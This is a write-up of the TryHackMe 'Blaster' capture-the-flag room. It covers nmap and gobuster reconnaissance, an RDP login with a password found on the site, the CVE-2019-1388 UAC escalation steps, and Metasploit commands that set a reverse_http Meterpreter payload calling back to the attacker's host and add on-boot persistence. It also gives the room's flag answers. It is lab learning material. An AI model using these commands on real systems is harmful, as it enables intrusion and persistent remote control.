# Blaster

## Mission Start!

The CTF background notes that we’ll be attacking a Windows box. So no ping responses again.

## Activate Forward Scanners and Launch Proton Torpedoes

The machine we’ll be attacking is at 10.10.223.185. As usual, we’ll start out with an [nmap](nmap.md) scan:

```bash
sudo nmap -v -oA blaster -Pn -A -T4 -sS -script vuln -p- 10.10.223.185
```

Which gives us:

```Nmap 7.92 scan initiated Wed Dec  8 19:55:54 2021 as: nmap -v -oA blaster -Pn -A -T4 -sS -script vuln -p- 10.10.223.185
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.223.185
Host is up (0.23s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016 (90%), FreeBSD 6.X (85%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2016 (89%), FreeBSD 6.2-RELEASE (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.013 days (since Wed Dec  8 19:54:04 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   34.47 ms  10.13.0.1
2   ... 3
4   351.16 ms 10.10.223.185

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  8 20:12:16 2021 -- 1 IP address (1 host up) scanned in 982.31 seconds
```

FLAG 1: How many ports are open on the target? — 2

Looks like IIS running on port 80. Let’s go take a peek.

…And, it’s just the default IIS “hello world” page. Looks a damn sight prettier than Apache’s.

FLAG 2: What is the title of the webserver’s index page? — IIS Windows Server

Since there’s nothing obvious here (and because the CTF is prompting us to do so), let’s sic [gobuster](gobuster.md) on this to see if there’s anything interesting that’s not linked to the (default) index page.

```bash
gobuster -t 10 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.223.185/
```

FLAG 3: What is the hidden directory on the webserver? — /retro

Browsing to this directory reveals an entire “Retro Fanatics” website. All posts are by “Wade”.

FLAG 4: What username is associated with this hidden directory? — Wade

Pocking around a bit more reveals a somewhat cryptic comment on a post:

> Leaving myself a note here just in case I forget how to spell it: parzival

Who wants to bet that this is Wade’s password?

FLAG 5: What potential password is associated with this user? — parzival

Let’s load up [XFreeRDP](xfreerdp.md) and see if we can log in, shall we?

```bash
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.223.185 /u:Wade /p:parzival
```

Boom!

FLAG 6: What are the contents of `user.txt`? — `THM{HACK_PLAYER_ONE}`

## Breaching the Control Room

There’s no obvious files when pocking around except an hhupd.exe file on the desktop, and IE’s history is empty.

Since I know we’re looking for a CVE name, at this point I just used the Windows File Explorer to search Wade’s home directory for “CVE”. And lo-and-behold, there’s a cached HTML file in C:/Users/Wade/AppData/Local/Microsoft/Windows/INetCache/Low/IE/7Z6YUWVY called cvename[1].htm which contains a website referencing CVE-2019-1388 (it looks like a slightly older version of [the MITRE CVE page on CVE-2019-1388](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1388)).

FLAG 7: What CVE was the initially compromised user researching? — CVE-2019-1388

(I feel like the approach I just used — making an educated guess about what the CTF was looking for and then just searching for it — is kind of a cop-out. *But*, the hint for this question states that I should check IE’s history, which I did… So perhaps the room’s broken?)

Anyways, I’m guessing that the hhupd.exe file on the desktop is the one that will exploit this vulnerability, since it’s badged as needing administrative privileges and CVE-2019-1388 is a vulnerability in the UAC screen.

FLAG 8: What is the name of the executable the user was experimenting with? — hhupd.exe

In fact, a search for “CVE-2019-1388 exploit” pulls up [this page](https://www.nagenrauft-consulting.com/2019/11/21/cve-2019-1388-hhupd-exe/) as its first result, which references hhupd.exe and helpfully links to [a YouTube video demoing how this exploit works](https://www.youtube.com/watch?v=3BQKpPNlTSo). It looks like the steps here are:

* Try to run hhupd.exe.
* Show details on the UAC prompt.
* Click on the certificate information link.
* Click on the issuer link. This will open up an instance of IE running with elevated permissions in the background.
* Exit the UAC dialog.
* Bring up the save dialog in IE.
* Navigate to `C:/Windows/System32/*.*` and open cmd.exe.

FLAG 9: What is the output of `whoami` in the terminal spawned using the user’s exploit? — `nt authority\system`

The final flag is in the Administrator’s Desktop folder.

FLAG 10: What are the contents of `root.txt`? — `THM{COIN_OPERATED_EXPLOITATION}`

## Adoption into the Collective

Target information isn’t immediately obvious in [Metasploit](metasploit.md); after selecting `exploit/multi/script/web_delivery` we’ll need to run `info` to see all of the options.

FLAG 11: What is the target number for PSH when using `exploit/multi/script/web_delivery` in [Metasploit](metasploit.md)? — 2

Let’s set things up and run the exploit:

```msfconsole
set target 2
set SRVHOST 10.13.26.40
set LHOST 10.13.26.40
set payload windows/meterpreter/reverse_http
run -j
```

(NOTE: I found that I needed to set the SRVHOST option to get [Metasploit](metasploit.md) to deliver the exploit on the right interface.)

This particular exploit outputs and encoded [PowerShell](powershell.md) script and then starts a local listener to deliver the actual [Meterpreter](metasploit.md) shell. All we need to do is cut-and-paste into our elevated shell.

(For whatever reason, I could *only* get this exploit working with the 32-bit version of [Meterpreter](metasploit.md) *and* the `run -j` command. I’m not sure why…)

FLAG 12: What command can be used in [Meterpreter](metasploit.md) to establish on-boot persistence on this machine? — `run persistence -X`

(NOTE: [Meterpreter](metasploit.md) flags this as being deprecated now; the modern pattern seems to be to background [Meterpreter](metasploit.md) and then switch to and exploit the `exploit/windows/local/persistence` module, probably with `set STARTUP SYSTEM`.)

ELAPSED TIME: 2 h 15 min

## References

* [TryHackMe: Blaster](https://tryhackme.com/room/blaster)

- - - -

👤 Nathan Acks  
📅 December 6, 2021
